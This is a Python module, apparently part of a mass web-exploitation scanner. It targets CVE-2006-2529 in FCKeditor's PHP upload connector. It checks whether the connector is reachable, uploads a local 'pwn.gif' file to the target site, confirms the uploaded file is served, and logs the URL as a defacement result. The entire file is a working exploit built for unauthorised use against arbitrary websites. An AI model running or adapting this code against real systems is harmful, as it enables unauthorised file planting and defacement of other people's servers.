# coding=utf-8
import requests, re
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def FckPath(zzz):
    try:
        find = re.findall(',"(.*)","', str(zzz))
        path = find[0].strip()
        return path
    except:
        pass


def Exploit(site, CMS):
    try:
        exp2 = '/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media'
        try:
            CheckVuln = requests.get('http://' + site + exp2, timeout=10, headers=Headers)
            if 'OnUploadCompleted(202' in str(CheckVuln.content):
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                           'Accept': '*/*'}
                exp = 'http://' + site + exp2
                po = {'Content_Type': 'form-data'}
                fil = {'NewFile': open('files/pwn.gif', 'rb')}
                rr = requests.post(exp, data=po, headers=headers, timeout=10, files=fil)
                if '.gif' in str(rr.content):
                    zart = FckPath(rr.content)
                    x = 'http://' + site + str(zart)
                    wcheck2 = requests.get(x, timeout=10, headers=Headers)
                    if wcheck2.status_code == 200:
                        check_deface = requests.get(x, timeout=10, headers=Headers)
                        if 'GIF89a' in str(check_deface.content):
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + str(zart) + '\n')
                            return printModule.returnYes(site, 'CVE-2006-2529', 'Fckeditor RFU', CMS)
                        else:
                            return printModule.returnNo(site, 'CVE-2006-2529', 'Fckeditor RFU', CMS)
                    else:
                        return printModule.returnNo(site, 'CVE-2006-2529', 'Fckeditor RFU', CMS)
                else:
                    return printModule.returnNo(site, 'CVE-2006-2529', 'Fckeditor RFU', CMS)
            else:
                return printModule.returnNo(site, 'CVE-2006-2529', 'Fckeditor RFU', CMS)
        except:
            return printModule.returnNo(site, 'CVE-2006-2529', 'Fckeditor RFU', CMS)
    except:
        return printModule.returnNo(site, 'CVE-2006-2529', 'Fckeditor RFU', CMS)
